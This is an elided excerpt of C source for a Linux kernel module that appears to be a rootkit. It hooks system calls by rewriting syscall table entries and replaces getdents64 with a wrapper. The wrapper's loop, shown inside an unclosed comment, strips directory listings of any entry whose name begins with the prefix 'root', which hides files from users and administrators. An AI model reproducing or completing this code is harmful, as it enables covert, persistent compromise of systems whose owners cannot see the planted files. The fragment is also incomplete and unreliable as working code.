 ...
 */
const static char* magic_prefix = "root";
...
int hook_syscall(t_syscall_hook *hook)
{
  ...
  printk(KERN_INFO "Hooking offset %d. Original: %llx to New:  %llx\n",
  ...
  printk(KERN_INFO "Done writing syscall\n");
...
int init_module(void)
{
  ...
  hook_syscall(new_hook(__NR_getdents64, (void*) &new_getdents64));
...
asmlinkage int new_open(const char *pathname, int flags, mode_t mode)
{
  ...
  //********
asmlinkage int new_getdents64(unsigned int fd, linux_dirent64 *dirp, unsigned int count) {
    int bpos = 0;
    struct linux_dirent64 *d;

    // Declare pointer to original getdents64 syscall
    int (*orig_func)(unsigned int, linux_dirent64 *, unsigned int);
    t_syscall_hook *getdents64_hook;

    // Find our syscall hook struct by offset (__NR_getdents64)
    getdents64_hook = find_syscall_hook(__NR_getdents64);
    orig_func = (void *)getdents64_hook->orig_func;

    // Call the original syscall
    printk(KERN_INFO "__x64_sys_getdents64() hook: calling orig\n");
    int nread = (*orig_func)(fd, dirp, count);
    if (nread <= 0)
        return nread;

   /*
    // Iterate over the buffer of linux_dirent64 entries
    while (bpos < nread) {
        d = (struct linux_dirent64 *)((char *)dirp + bpos);

        // Check if this entry's name starts with magic_prefix
        if (startsWith(magic_prefix, d->d_name)) {

            int reclen = d->d_reclen;
            char *next_rec = (char *)d + reclen;
            unsigned int bytes_to_move = nread - (bpos + reclen);

            // Shift the rest of the buffer to overwrite this entry
            memmove(d, next_rec, bytes_to_move);

            nread -= reclen;
            // Do not advance bpos, as we have new entry at current offset
            continue;
        }
        bpos += d->d_reclen;
    }
